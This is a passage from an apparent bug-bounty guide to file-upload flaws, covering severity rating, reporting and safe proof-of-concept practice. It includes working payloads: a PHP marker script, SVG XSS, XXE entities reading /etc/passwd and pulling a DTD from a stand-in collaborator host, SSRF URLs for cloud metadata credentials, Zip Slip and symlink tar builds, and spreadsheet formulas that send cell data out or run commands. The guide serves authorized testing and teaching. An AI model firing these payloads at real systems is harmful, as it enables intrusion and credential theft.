
## 12.2 Prove it SAFELY (marker, not a backdoor)
Don't drop an interactive shell. Upload a file that **prints a unique token** (proves code executes) — that's a complete RCE PoC:
```php
<?php echo "RCE-POC-" . md5("yourhandle-unique"); echo "-" . php_uname(); ?>
```
Request it → seeing `RCE-POC-<hash>-Linux host...` in the response **proves remote code execution** (the server ran your PHP and leaked the hostname). For an even cleaner single-command proof, `echo` the output of one read-only command. **Stop there** — you've proven Critical RCE without a usable backdoor. See `poc/webshell_marker.php`.

> **If this → then that:** upload accepted but you can't find the URL → traversal (§9) to place it in a known web path, or check the import/processing pipeline. Stored but served as `text/plain` (not executed) → it's *not* RCE; pivot to XSS/parser bugs (don't report "uploaded a php file" as RCE — §23).

## 12.3 Winning the validate-then-delete race (TOCTOU)
A common "safe" pattern is **save → then validate/AV-scan/re-encode/rename/delete**. Between *save* and *delete* there's a window where the malicious file is **on disk and reachable** — request it fast enough and it executes before removal.
```
1. Upload the shell (e.g. shell.php containing the RCE marker) — even to a dir that "rejects" it after a check.
2. SIMULTANEOUSLY hammer GET requests to its likely URL (Burp Turbo Intruder / parallel curl) during the window.
3. A 200 with your RCE marker (before the 404 once it's deleted) = RCE via the race.
```
Variants: "upload → quarantine/move" (hit it before the move), "upload → process → remove temp" (hit the temp path), and the PHP **`LFI + phpinfo()` temp-file race** (leak the random `/tmp/phpXXXXXX` name from a phpinfo page, then `include` it before PHP deletes it — cross-ref the LFI kit).
> **If this → then that:** the server returns "file type not allowed" *after* a delay (it saved first, then validated/deleted) → there's a **race window**. Fire many parallel GETs to the stored URL during upload; catching one execution = RCE. Randomized filenames make this harder — but the response, a predictable temp path, or an LFI to include the temp upload can still win.

---

# 13. Stored XSS via Upload

When a file is served **inline from the app origin**, an uploaded SVG/HTML/XML executes JS in that origin → stored XSS (often 0-click, sometimes admin-rendered = Critical).

## 13.1 SVG (the workhorse)
```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <script>alert(document.domain)</script>
</svg>
```
Upload as `x.svg` (or polyglot `x.svg` with `image/svg+xml`). **It's only XSS if** served `Content-Type: image/svg+xml` (or sniffable) **inline** from the **app origin**. See `poc/xss.svg`.

## 13.2 Other vectors
```
□ .html / .xhtml uploads served inline from app origin → direct stored XSS.
□ Filename XSS: "><img src=x onerror=alert(document.domain)>.png reflected in a file list (§9).
□ PDF with JS (rendered inline in some viewers).
□ Polyglot image/HTML if nosniff is missing (Content-Type sniffed to HTML).
□ Metadata XSS: payload in EXIF rendered unescaped in a gallery/admin view.
```
> **Severity driver (same as XSS guide §16.1):** app-origin inline SVG/HTML = real stored XSS (High; Critical if it lands in an admin/staff view). Sandboxed CDN + `Content-Disposition: attachment` + `nosniff` = near-zero — don't over-report it (§23). Always confirm the **serving origin and headers** (§4) before claiming XSS. Escalate XSS → ATO with the XSS guide (§24–§27).

---

# 14. XXE via Uploaded Files

> *In plain words:* lots of "files" are secretly XML — an SVG, and every Office doc (DOCX/XLSX are just zipped XML). If the server parses that XML with external entities switched on, your uploaded "image" or "resume" can order it to read a local file (`/etc/passwd`, cloud creds) or make internal requests. The tell: an upload that produces a **preview or thumbnail** is an upload the server *parsed* — test XXE first.

File formats that are **XML under the hood** become XXE when the server parses them with external entities enabled → file read, SSRF, sometimes RCE.

## 14.1 XML-based upload formats to target
```
□ SVG (image)                      → parsed as XML by many processors
□ DOCX / XLSX / PPTX (Office)       → ZIP of XML; the [Content_Types].xml / document.xml parsed
□ .xml / .xsd / .xsl / .svg imports
□ SAML / config / .plist / RSS/OPML / GPX / KML
```

## 14.2 The payload (OOB for blind = the common case)
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg"><text x="10" y="20">&xxe;</text></svg>
```
If the result (thumbnail/preview/error) reflects `&xxe;` → in-band file read. If not, go **blind/OOB**:
```xml
<!DOCTYPE svg [
  <!ENTITY % p SYSTEM "http://YOUR.oast.fun/x.dtd"> %p;
]>
```
Host a DTD that exfiltrates a file to your collaborator. See `poc/xxe.svg` + `poc/xxe_oob.dtd`.

> **If this → then that:** a KYC/avatar upload generates a **preview** → the server parsed your SVG/Office file → test XXE first (file read of `/etc/passwd`, cloud metadata via SSRF, internal port scan). XXE on an upload is typically **High–Critical** (arbitrary file read / SSRF / sometimes RCE via PHP `expect://`).

---

# 15. SSRF via Upload-from-URL & File Fetch

"Import from URL", "fetch avatar by link", "import remote document", and server-side URL preview features make the **server** fetch a URL you supply → SSRF.

```
□ Point the URL at internal/cloud targets:
   http://169.254.169.254/latest/meta-data/iam/security-credentials/   (AWS metadata → creds!)
   http://metadata.google.internal/computeMetadata/v1/                 (GCP)
   http://127.0.0.1:port / http://internal-host/                        (internal services)
   file:///etc/passwd                                                   (if file:// allowed → LFI)
   gopher:// dict:// (protocol smuggling, advanced)
□ Bypass URL filters: DNS rebinding, decimal/octal IP, [::], @-tricks, redirects to internal (see Recon §11.2 / SSRF lore).
```
**Confirm blind SSRF via your OOB listener**, then escalate to internal reach/metadata creds.

> **If this → then that:** "upload from URL" exists → this is often the **fastest Critical** in the whole upload surface (cloud-metadata creds = full account/infra compromise). Test it before fiddling with extensions. XXE (§14) and SSRF chain: XXE can *cause* SSRF too.

---

# 16. Image / Document Processing Exploits

> *In plain words:* when a target re-encodes every image, most hunters give up on RCE — that's exactly the mistake. If the server *processes* your file with a buggy library (ImageMagick, Ghostscript, exiftool, FFmpeg), **the processing itself is the exploit**: your payload is a genuinely valid file of an allowed type that detonates *inside* the parser. No web shell, no executable extension, no reachable web root needed — which is why these Criticals sit un-found on "secure" allowlist+sandbox uploads.

When the server **processes** the file with a vulnerable library, the *processing itself* is the RCE/SSRF/file-read — **no web shell, no executable extension, no reachable web root needed.** This is the single most under-tested path to Critical on "secure" allowlist+sandbox uploads, because the payload is a *valid file of an allowed type* that detonates inside the processor. Full payload recipes & CVE list: `FILE_UPLOAD_ARSENAL.md` §P.

**The processor RCE matrix (match the library + version — fingerprint via §4/§11 behaviour & error strings):**
```
□ ImageMagick "ImageTragick" (CVE-2016-3714) → RCE via crafted MVG/MSL/SVG delegate abuse (https/url/ephemeral/`|`).
   Also: CVE-2022-44268 (arbitrary FILE READ — a crafted PNG makes `convert` embed a server file in the output PNG),
   shell metacharacters in filenames passed to `system()`-style delegates. Trigger: any resize/convert/thumbnail.
□ Ghostscript (PostScript/PDF/EPS) → RCE — CVE-2018-16509, CVE-2019-6116, CVE-2021-3781, CVE-2023-36664 (`%pipe%`/`-sOutputFile`).
   Triggered whenever a PDF/EPS/PS is rendered, thumbnailed, or converted (often via ImageMagick's PDF delegate → Ghostscript).
□ exiftool (CVE-2021-22204) → RCE via crafted DjVu metadata when the server runs exiftool on the upload (very common in pipelines).
□ FFmpeg (HLS/SSRF & local file read) → a crafted .m3u8/.avi/.mp4 (or "compressed-online" SSRF) reads /etc/passwd or hits
   169.254.169.254 and embeds the result in the transcoded output → server-side file read + SSRF on any video/audio upload.
□ LibreOffice / Office conversion → macro / formula / external-data RCE & file read on doc→pdf conversion.
□ PDF/HTML generators (wkhtmltopdf, headless Chrome, Prince) → SSRF + local file read: an uploaded/derived HTML with
   <iframe src="file:///etc/passwd"> or <iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
   renders the secret INTO the generated PDF → cloud IAM creds → cloud takeover (cross-ref SSRF kit §11/§16).
□ libraw / dcraw (RAW images), libvips, GraphicsMagick → assorted memory-safety + delegate CVEs; match version.
□ Apache POI / docx4j / XML-backed office parsers → XXE on docx/xlsx/pptx ingest (§14) → file read / SSRF.
□ Pillow / ImageIO / Jimp / sharp → occasional decode CVEs; fingerprint the library+version from errors/timing.
□ jQuery-File-Upload (CVE-2018-9206) and other vulnerable upload widgets → direct RCE in the upload component itself.
```
```bash
# exiftool CVE-2021-22204 proof (benign OOB marker, authorized testing):
#   craft a DjVu/jpeg metadata payload that runs a single OOB curl to your collaborator.
#   (generator scaffold in poc/exif_rce_notes.md — keep the command BENIGN: a ping/marker, not a shell.)
# ImageMagick CVE-2022-44268 file-read proof: upload a crafted PNG that names a server file; download the
#   processed PNG and extract the embedded bytes (a benign target like /etc/hostname proves it).
# PDF-generator SSRF proof: get <iframe src="http://YOUR.oast.fun/"> into the source → an OOB hit from the server IP.
```
> **If this → then that:** baseline showed re-encoding / thumbnailing / "we generate a PDF" / "convert your video" (§4/§11) → **identify the processor** (ImageMagick? Ghostscript? exiftool? FFmpeg? wkhtmltopdf?) from behaviour, response headers, or error strings, then fire its known CVE/SSRF payload. A **processing RCE is Critical**, a **processing SSRF→metadata is Critical** (cloud creds), and a **processing file-read is High** — all are routinely *un-duplicated* because most hunters stop at "the image got resized." Prove RCE with a benign OOB callback (not a real command), and prove SSRF/file-read with a benign target.

---

# 17. Archive Attacks — Zip Slip & Zip Bomb

> *In plain words:* when the server unzips your archive it trusts the *names inside the zip*. Name an entry `../../../../var/www/html/shell.php` and a careless extractor writes it **outside** the intended folder — into the web root — giving you file-write-anywhere from a plain "upload a .zip we'll extract." A symlink entry is the read-side twin: it can slurp `/etc/passwd` or overwrite `~/.ssh/authorized_keys`.

Features that **extract** uploaded archives (themes, plugins, bulk-import, backup-restore) are dangerous.

## 17.1 Zip Slip (path traversal on extraction → RCE/overwrite)
A zip entry with a traversal path writes **outside** the extraction dir on unzip:
```
entry name:  ../../../../var/www/html/shell.php
```
Build it so extraction drops a script into the web root → RCE; or overwrite a config/key. See `poc/make_zipslip.py`.

## 17.2 Symlink archives (read/overwrite host files on extraction)
A tar/zip can contain a **symlink** entry. If the extractor follows symlinks, you read or overwrite arbitrary host files:
```
1. entry "link"  → symlink to  /etc/passwd  (or /var/www/html/, ~/.ssh/authorized_keys, an app config/key)
2. entry "link/x" or a second entry that WRITES THROUGH the link → overwrites the target; or the app later SERVES
   "link" back to you → reads the target file (secret disclosure).
# build (tar preserves symlinks):
ln -s /etc/passwd link && tar -chf evil.tar link        # or craft the symlink entry directly
```
Common in CI/build/import/backup-restore pipelines that `tar -x`/`unzip` uploads. → secret read or RCE (overwrite a served/trusted file).

## 17.3 Zip bomb / decompression DoS
A tiny zip that expands to terabytes (nested or highly-repetitive) exhausts disk/memory. **Only test where DoS is in scope and with care** — prove the *expansion ratio* conceptually rather than actually exhausting a production host (§19, §23).

> **If this → then that:** any "upload a .zip/.tar and we extract it" (plugin/theme/import/restore/backup) → **Zip Slip** first (often direct RCE), then **symlink** entries (read secrets / overwrite trusted files). These features are frequently admin-only → if you reach them, it's a fast Critical.

---

# 18. File Overwrite / IDOR / Path-Based ATO

When the stored path/filename/ID is attacker-influenced, you may **overwrite another user's file** or a system file.

```
□ Predictable/IDOR storage path: /uploads/<user_id>/avatar.png → set user_id to a victim → overwrite their avatar/doc.
□ Pre-signed S3 PUT where you control the key → write to another user's key / a sensitive key.
□ Overwrite a config/template/key the app trusts → defacement, logic change, or RCE.
□ Overwrite YOUR file with a different type after a type check (TOCTOU/race, §19) → stored XSS/RCE post-validation.
□ Filename collision → overwrite a shared asset rendered to others → stored XSS to all viewers.
```
> **If this → then that:** you can overwrite a *victim's* document/avatar → integrity/IDOR (Medium–High). Overwrite a file the **app executes or trusts** (a JS bundle served to all users, an admin template) → **stored XSS-to-all / RCE / ATO** (Critical). Always check whether the overwrite target is rendered to *others*.

## 18.1 Pre-signed URL & direct-to-cloud upload abuse (S3/GCS/Azure)
Many apps hand the client a **pre-signed PUT URL** (or accept upload params) so it uploads straight to a bucket. The bug surface is **what you control in that flow**:
```
□ KEY/PATH control: does the app let you choose the object key? → write to ANOTHER user's key, a sensitive prefix,
   or traverse (key = "../../config/app.js") → overwrite a served asset → stored XSS-to-all / supply-chain.
□ CONTENT-TYPE control: can you set the object's Content-Type to text/html / image/svg+xml? → if it's served inline
   from an app-trusted origin, that's stored XSS. (Pre-signed PUTs often let you set Content-Type.)
□ ACL control: can you send x-amz-acl: public-read (or a public ACL param)? → make an object world-readable, or
   upload web content to a bucket that backs the site.
□ SCOPE of the presign: is the presigned URL over-broad (whole bucket, long TTL, any key)? → write beyond your folder.
□ The bucket itself: world-writable / public-list (cloud_enum) → upload/overwrite directly (cross-ref Recon §19).
```
Test: intercept the presign request/response, then craft the PUT yourself (curl) altering **key**, **Content-Type**, and **ACL**; confirm by fetching the object back and reading its served `Content-Type`/origin.
> **If this → then that:** you control the **key** in a presigned PUT → overwrite a JS/HTML asset the app serves to everyone → **stored XSS / supply-chain compromise** (Critical). You control the **Content-Type** and the object is served inline from an app origin → **stored XSS**. A presign with too-broad scope/TTL → write to keys other services trust. Validate read-only and don't clobber real data.

---

# 19. DoS via Upload

Lower priority (many programs treat DoS as out-of-scope — **check first**), but real where in scope:
```
□ Pixel-flood / decompression bomb image (small file, huge dimensions) → memory exhaustion during processing.
□ Zip bomb (§17.2).
□ No size limit → fill disk.
□ Expensive processing (huge PDF/video) → CPU exhaustion.
□ ReDoS via filename/metadata parsing.
```
> **Prove the *condition* safely** — a decompression ratio / a single processing timeout on a non-prod target — never actually take down production. Most programs reward the *finding*, not the outage (§23, §26).

---

# 20. CSV / Formula Injection

When uploaded/imported data is later **exported to CSV/XLSX** and opened in a spreadsheet, a cell beginning with `= + - @` executes a formula on the *victim's* machine (data exfil / command exec).
```
=HYPERLINK("//YOUR.oast.fun/?c="&A1,"click")
=cmd|'/c calc'!A1                  (legacy Excel command exec)
@SUM(1+1)*cmd|'/c calc'!A1
```
> Not server-side RCE — it's client-side on whoever opens the export (often **staff/admin**). Reportable where you control imported data that staff export. Medium typically; higher if it reliably hits an admin.

---

# PART IV — VALIDITY, SEVERITY & REPORTING

# 21. The Escalation Mindset

A triager's first question is **"what does the upload let you actually do?"** Answer, in descending value:
```
1. RCE (web shell / .htaccess / processing exploit / zip slip)        → Critical
2. XXE (arbitrary file read / SSRF) or SSRF (metadata creds)          → High–Critical
3. Stored XSS served from app origin (esp. admin-rendered)            → High (Critical if admin/ATO)
4. Overwrite another user's file / path-traversal write              → Medium–High (Critical if → RCE/ATO)
5. DoS (where in scope), CSV injection hitting staff                  → Medium
6. "It accepted a .php / .exe" with no execution or reachable context → Info/None (§23)
```
Climb to the highest the context allows and **demonstrate it with a benign marker**. The upload accepting your file is the *door*; the report is what you reached through it.

---

# 22. The Validity-First Mindset

## 22.1 The four questions a triager asks (answer them in your report)
1. **Does the uploaded file actually execute / get parsed dangerously, or is it just stored?** Show the *result* (marker executed, file read via XXE, JS ran in app origin), not "it uploaded."
2. **Where is it served, and in what context?** App origin + executed/inline = real; sandbox CDN + attachment + nosniff = not.
3. **What's the impact and who's affected?** RCE on the server, another user's data, an admin — name it.
4. **Reproducible & in scope?** Production endpoint, the exact crafted file, the request, and the response proving impact.

## 22.2 The "accepted vs executed" rule (most important)
| You have | Standalone verdict | Becomes valuable when… |
|---|---|---|
| Server accepted a `.php`/`.svg` | Info | …it's **served from app origin and executes/renders** (§12/§13). |
| `.svg` XSS but on a sandbox CDN + attachment | Low/None | …it's served **inline from the app origin** (§13/§23). |
| Path traversal in filename | Medium | …it **writes to the web root (→RCE)** or **overwrites a victim's file** (§9/§18). |
| Re-encoded image accepted | None | …the **processor** (ImageMagick/exiftool) is exploitable (§16). |
| "Import from URL" present | — | …it reaches **internal/metadata** = SSRF (§15). |
| Office/SVG upload parsed | — | …it yields **XXE** file read/SSRF (§14). |

## 22.3 Production-scope discipline
Confirm on the **production** config (real handlers, real CDN, real headers). A shell that only runs because *you* set a permissive local server proves nothing. Re-test after partial fixes — blocking `.php` but not `.phtml`, or sanitizing `../` once but not `....//`, is a fresh valid finding.

---

# 23. False Positives — STOP reporting these (auto-reject list)

| # | Commonly mis-reported | Why it's NOT (by default) | When it IS valid |
|---|---|---|---|
| 1 | **"I uploaded a .php/.exe/.sh"** | Acceptance ≠ execution. If it's never run/served as code, it's nothing. | It executes (§12) or is served as code/inline. |
| 2 | **SVG/HTML XSS on a sandboxed CDN** (`usercontent`, S3, `Content-Disposition: attachment`, `nosniff`) | Doesn't run in the app origin → no real impact. | Served **inline from the app origin** (§13). |
| 3 | **Uploaded an EICAR/AV test / malware** | "AV didn't catch it" isn't a vuln; no impact. | Only if it leads to execution/processing impact. |
| 4 | **Stored file with a "dangerous" extension, served as `text/plain`** | The server treats it as text → not executed. | If a handler executes it (§12). |
| 5 | **Self-only overwrite** (you replace your own avatar) | No cross-user/privilege effect. | Overwriting **another user's** or a **shared/trusted** file (§18). |
| 6 | **DoS where DoS is out of scope** | Many programs exclude it. | Where explicitly in scope and proven safely (§19). |
| 7 | **"No file-type validation"** as High, with no execution | A hardening gap, not impact. | Tie it to a real exec/XSS/XXE outcome. |
| 8 | **CSV injection with no realistic export/victim** | If nobody exports it to a spreadsheet, no impact. | Imported data that **staff export & open** (§20). |
| 9 | **Polyglot accepted but never interpreted as the second type** | Acceptance ≠ interpretation. | The second interpretation actually occurs (executed/parsed). |
| 10 | **Path traversal that's normalized server-side** | If it lands in the normal dir, no traversal. | It actually writes outside / overwrites (§9/§18). |

> Rule of thumb: if you can't write *"the server (or another user/admin) does X because of my file,"* you have an **observation**, not a finding. Keep escalating (find the serving context, the parser, the handler) or drop it.

---

# 24. Severity Calibration — how triagers really rate upload bugs

| Scenario | Typical alone | Realistic chained | What moves it |
|---|---|---|---|
| **RCE** (web shell / .htaccess / processing / zip slip) | **Critical** | Critical | Confirmed code exec on the server. The top. |
| **XXE → arbitrary file read / SSRF** | **High–Critical** | Critical | Up with internal/metadata reach or RCE. |
| **SSRF via URL-fetch → cloud metadata creds** | **High–Critical** | Critical | Metadata creds = infra compromise. |
| **Stored XSS, app-origin inline** | **High** | Critical (admin/ATO) | Up if admin-rendered or chained to ATO. |
| **Path traversal write / overwrite victim file** | **Medium–High** | Critical | Up if → RCE (web root) or → ATO. |
| **Stored XSS, sandbox CDN** | **Low/None** | — | Generally not impactful (§23). |
| **CSV/formula injection hitting staff** | **Medium** | High | Reliable admin victim. |
| **DoS (in scope)** | **Low–Medium** | — | Prove safely. |
| **"Accepted dangerous file", no exec** | **Info** | — | Don't lead with it. |

**CVSS / CWE pointers:**
- RCE: `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` → Critical. **CWE-434** (Unrestricted Upload of File with Dangerous Type).
- XXE: **CWE-611**; SSRF: **CWE-918**; path traversal: **CWE-22**; stored XSS: **CWE-79**; zip slip: **CWE-22**.
- Anchor to the *outcome's* CWE, not just CWE-434, when the impact is XXE/SSRF/XSS.

---

# 25. Impact-Escalation Playbooks — "you found X, now do Y"

### 25.1 You found: *the upload accepts arbitrary extensions/content*
- **Escalate:** find the **serving URL + handler** (§4). If web root + PHP/ASPX handler → upload a **marker** script (§12) → request it → RCE. If served inline from app origin → SVG/HTML **stored XSS** (§13).
- **Evidence:** the marker executed (RCE token + hostname), or `alert(document.domain)` from the app origin.
- **Severity:** Critical (RCE) / High (XSS).

### 25.2 You found: *files are re-encoded / thumbnailed*
- **Escalate:** identify the **processor** → test ImageTragick / Ghostscript / exiftool CVE (§16), or XXE if it's XML-based (§14). Use a **benign OOB** to confirm.
- **Evidence:** collaborator callback from the server during processing; or a file read via XXE.
- **Severity:** Critical (processing RCE) / High–Critical (XXE).

### 25.3 You found: *"import from URL" / remote fetch*
- **Escalate:** SSRF to `169.254.169.254` (cloud creds), internal hosts, `file://` (§15). Bypass filters via redirect/DNS-rebinding.
- **Evidence:** metadata creds or an internal-only response fetched server-side.
- **Severity:** High–Critical.

### 25.4 You found: *SVG/Office/XML upload that's parsed*
- **Escalate:** XXE → read `/etc/passwd`/app config, or OOB exfil + SSRF (§14).
- **Evidence:** file contents in the preview/error, or an OOB DTD callback with file data.
- **Severity:** High–Critical.

### 25.5 You found: *filename or path is attacker-controlled*
- **Escalate:** traversal to web root → RCE (§9/§12); or overwrite a **victim's** file / a **shared** asset → IDOR/stored-XSS-to-all (§18); or filename → stored XSS (§13).
- **Evidence:** the file written outside the intended dir, or another user's asset replaced (your two test accounts).
- **Severity:** Medium–Critical by what you reach.

### 25.6 You found: *zip/archive extraction*
- **Escalate:** Zip Slip path traversal → drop a script in the web root → RCE (§17).
- **Evidence:** the extracted file at an out-of-dir path executing.
- **Severity:** Critical.

### 25.7 You found: *stored XSS via uploaded SVG, but on a CDN*
- **Escalate:** check if **any** path serves it inline from the **app origin** (some apps proxy/preview user files on the main domain); check missing `nosniff`. If truly sandboxed → it's Low; don't inflate (§23).
- **Evidence:** execution in the app origin, or honest acknowledgement of the sandbox.
- **Severity:** High if app-origin; Low if sandboxed.

---

# 26. Building a Professional, Safe PoC

A great upload PoC is **unambiguous, minimal, and harmless.**
```
DO:
  □ Prove RCE with a UNIQUE MARKER / single read-only command (id, hostname, a random token) — NOT a backdoor.
  □ Prove XSS with alert(document.domain) from the app origin (screenshot the URL bar).
  □ Prove XXE/SSRF with an OOB callback to YOUR collaborator (benign ping), not real data theft.
  □ For overwrite/IDOR, use YOUR OWN two test accounts (A overwrites B's file, both yours).
  □ Keep the crafted file + the exact request + the response proving impact.
  □ DELETE your uploaded test files afterward; note that you did.
DON'T:
  □ Drop an interactive web shell, run destructive commands, or pivot deeper than proof.
  □ Read/exfiltrate real users' files or real secrets (read a benign marker file you placed, or /etc/hostname).
  □ Actually DoS production. Demonstrate the ratio/condition safely.
  □ Leave persistent payloads, .htaccess, or shells on the server.
```
> A marker that prints `RCE-POC-<hash>-<hostname>` is a *complete* Critical RCE proof. Triagers don't need (and don't want) a weaponized shell. Restraint here keeps you legal and paid (XSS/JWT guides make the same point).

**Remediation to include:** server-side **allowlist** of extensions *and* validate magic bytes *and* re-encode images; store uploads **outside the web root** / on a **sandboxed origin** with `Content-Disposition: attachment` + `X-Content-Type-Options: nosniff`; randomize filenames; disable dangerous parser features (XXE off, ImageMagick policy.xml, drop Ghostscript delegates); block config files (`.htaccess`/`web.config`); validate archive paths (no `../`); scan + size-limit.

---

# 27. Reporting, CWE/CVSS & De-duplication

Use `FILE_UPLOAD_REPORT_TEMPLATE.md`. Minimum:
```
1. Title        "Unrestricted file upload in <feature> → RCE via .phtml web shell"  (name the IMPACT)
2. Severity     CVSS 3.1 vector + score + outcome CWE (434/611/918/22/79)
3. Asset        exact endpoint + parameter + the storage path + serving URL/headers (from §4)
4. Summary      which control was bypassed + how + the resulting impact
5. Steps        numbered: the crafted file, the upload request, the request that triggers impact
6. PoC          the benign marker file + the response proving execution/impact; screenshot
7. Impact       RCE / XXE / SSRF / stored XSS / overwrite — the "so what"
8. Remediation  the §26 fixes most relevant to the root cause
```
**De-dup:** one root cause = one finding (e.g., the same weak validator reachable from 3 upload forms is **one** bug; lead with the highest-impact instance). Don't split "accepted .phtml" and "achieved RCE" — they're one report.

---

# 28. Automation & Red-Team Notes

**Automation (find candidates fast, verify by hand):**
```bash
# Burp "Upload Scanner" BApp — fires extension/MIME/magic/polyglot matrices automatically and checks for exec/XSS/DoS.
# fuxploider — discovers which extensions/types bypass:
python3 fuxploider.py --url https://target/upload --not-regex "error"
# nuclei — known upload-exposure/processor CVEs:
nuclei -u https://target -tags fileupload,imagemagick,exiftool
```
- **Quality gate:** never submit "the scanner uploaded a php." Reproduce the **execution/impact** by hand, confirm the **serving context** (§4), and prove with a benign marker (§26).

**Red-team angles:**
```
□ Theme/plugin/template upload in admin panels → direct RCE → persistence (a benign web-beacon, then clean up).
□ Processing pipelines (ImageMagick/Ghostscript/exiftool/ffmpeg) → RCE on internal workers (often un-firewalled).
□ Pre-signed upload + path control → write to keys other services trust (supply-chain within the app).
□ Overwrite a JS bundle/asset served to all users → mass stored XSS → broad compromise.
□ Chain: SSRF (upload-from-URL) → cloud metadata → cloud account takeover.
```

---

# Appendix A — Upload Workflow Cheat Sheet

```
┌────────────────────────────────────────────────────────────────────┐
│                    FILE UPLOAD WORKFLOW                             │
├────────────────────────────────────────────────────────────────────┤
│ 0. RECON: find EVERY upload point (avatar/import/from-URL/admin) §3 │
│ 1. BASELINE ★ : upload a valid file →                              │
│    • WHERE stored?  • WHAT url serves it?  • Content-Type/handler? §4│
│    • map controls: client/MIME/ext/magic/re-encode/storage         │
│ 2. BYPASS CONTROLS (in order):                                     │
│    client(§5) → MIME(§6) → extension(§7) → magic/polyglot(§8)       │
│    → filename/traversal(§9) → .htaccess/web.config(§10) → re-enc(§11)│
│ 3. IMPACT ⭐ (route by what the server DOES with the file):         │
│    web root + handler ........ RCE web shell (marker!)      §12     │
│    app-origin inline ......... stored XSS (SVG/HTML)        §13     │
│    parses XML/Office/SVG ..... XXE (file read/SSRF, OOB)    §14     │
│    "import from URL" ......... SSRF → metadata creds        §15     │
│    re-encodes/thumbnails ..... processor RCE (ImageMagick/  §16     │
│                                exiftool/Ghostscript)               │
│    extracts archives ......... Zip Slip → RCE              §17     │
│    attacker path/filename .... overwrite/IDOR → ATO/RCE    §18     │
│ 4. VALIDATE → REPORT:                                              │
│    false-positive filter(§23) · CVSS+CWE-434/611/918(§24)          │
│    SAFE marker PoC, delete artifacts(§26) · title=IMPACT(§27)      │
└────────────────────────────────────────────────────────────────────┘
```

---

# Appendix B — Upload Attack Decision Tree

```
Uploaded a valid file (§4) →
│
├─ Where is it SERVED from?
│    ├─ App origin, served INLINE, Content-Type honored / no nosniff
│    │     └─ upload SVG/HTML → STORED XSS (§13). Admin-rendered? → Critical.
│    ├─ Web root + script handler (PHP/ASPX/JSP)
│    │     └─ bypass ext/magic (§7/§8) → marker web shell → RCE (§12). Critical.
│    └─ Sandbox CDN + attachment + nosniff → low XSS ceiling; pivot to parse/URL bugs.
│
├─ Does the server PARSE/PROCESS the file?
│    ├─ XML-based (SVG/Office/XML) → XXE (file read/SSRF, OOB) (§14).
│    ├─ Image re-encode/thumbnail → identify processor → ImageMagick/exiftool/Ghostscript CVE (§16).
│    └─ Archive extract → Zip Slip → RCE (§17).
│
├─ Is there an "import from URL" / remote fetch? → SSRF → cloud metadata creds (§15). Fast Critical.
│
├─ Is the filename/path attacker-controlled? → traversal to web root (RCE) / overwrite victim file (IDOR→ATO) (§9/§18).
│                                            → filename reflected? → stored XSS (§13).
│
└─ None of the above reachable (re-encoded, random name, sandbox, no parser, no URL-fetch)?
      → upload is well-hardened. Don't over-invest; record as coverage; move to another feature (§4/§23).

ALWAYS: prove impact with a BENIGN MARKER / OOB ping; confirm SERVING CONTEXT before claiming XSS/RCE.
```

---

# Appendix C — Important Links & References

**Primary (learn + labs + defense)**
- OWASP — *Unrestricted File Upload*: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- OWASP — *File Upload Cheat Sheet* (the canonical defense list): https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- OWASP WSTG — *Testing for Unexpected/Malicious File Types*: https://owasp.org/www-project-web-security-testing-guide/
- PortSwigger Web Security Academy — *File upload vulnerabilities* (topic + labs incl. flawed type validation / `.htaccess` / polyglot / race): https://portswigger.net/web-security/file-upload
- PayloadsAllTheThings — *Upload Insecure Files*: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
- HackTricks — *File Upload*: https://book.hacktricks.xyz/pentesting-web/file-upload
- PentesterLab — *File Upload / Web for Pentester*: https://pentesterlab.com/exercises · Hackviser — file-upload labs: https://hackviser.com/

**Foundational research & talks (where these techniques come from)**
- **Ange Albertini / Corkami** — polyglot file formats (the canonical reference for the §8 polyglots): https://github.com/corkami/pocs · https://github.com/corkami/mitra
- **Sam Thomas — "It's a PHP Unserialization Vulnerability Jim, but Not as We Know It"** (Black Hat USA 2018) — `phar://` deserialization via file ops (cross-ref `../Deserialization/`).
- **Snyk — Zip Slip** (2018) — arbitrary file write via archive extraction: https://security.snyk.io/research/zip-slip-vulnerability
- **ImageTragick** (CVE-2016-3714, ImageMagick delegate RCE): https://imagetragick.com/
- **neex — FFmpeg HLS/AVI SSRF & local file read**: https://github.com/neex/ffmpeg-avi-m3u-xbin
- **Assetnote** (appliance/upload CVE deep-dives): https://blog.assetnote.io/ · **SonarSource / Sonar Research** (source-level upload & parser bugs): https://www.sonarsource.com/blog/
- **Cure53** (SVG / DOMPurify sanitization — the §13 SVG-XSS angle): https://cure53.de/#publications
- **Google Project Zero** (image/parser memory-safety CVEs — ImageMagick/GraphicsMagick/libraw): https://googleprojectzero.blogspot.com/
- **Black Hat / DEF CON** — ImageTragick, FFmpeg-HLS, `phar`, polyglot & upload-WAF-bypass talks.

**Real-world CVEs & bug-bounty writeups**
- ImageMagick file read (CVE-2022-44268) · Ghostscript RCE (CVE-2018-16509 / CVE-2023-36664 `%pipe%`) · exiftool RCE (CVE-2021-22204) · jQuery-File-Upload RCE (CVE-2018-9206) · Tomcat PUT/JSP (CVE-2017-12615/12617) · ColdFusion FCKeditor (CVE-2009-2265): https://nvd.nist.gov/
- Disclosed **HackerOne / Bugcrowd** reports — search *"file upload → RCE"*, *"SVG stored XSS"*, *"XXE via DOCX"*, *"import-from-URL SSRF → metadata"*; endless WordPress-plugin *arbitrary file upload* CVEs (wpscan / Exploit-DB).

**Tools**
- fuxploider: https://github.com/almandin/fuxploider · Upload_Bypass: https://github.com/sAjibuu/Upload_Bypass
- Burp *Upload Scanner* (NCC) + *HTTP Request Smuggler* (multipart parsing) · Nuclei (`-tags fileupload,imagemagick,exiftool,xxe`) · exiftool · ysoserial / ysoserial.net (deser-via-upload).

**Standards / references**
- MIME / magic numbers: https://www.iana.org/assignments/media-types · https://en.wikipedia.org/wiki/List_of_file_signatures
- **CWE-434** (Unrestricted Upload) · CWE-611 (XXE) · CWE-918 (SSRF) · CWE-22 (path traversal / Zip Slip) · CWE-79 (stored XSS) · CWE-502 (deserialization): https://cwe.mitre.org/

---

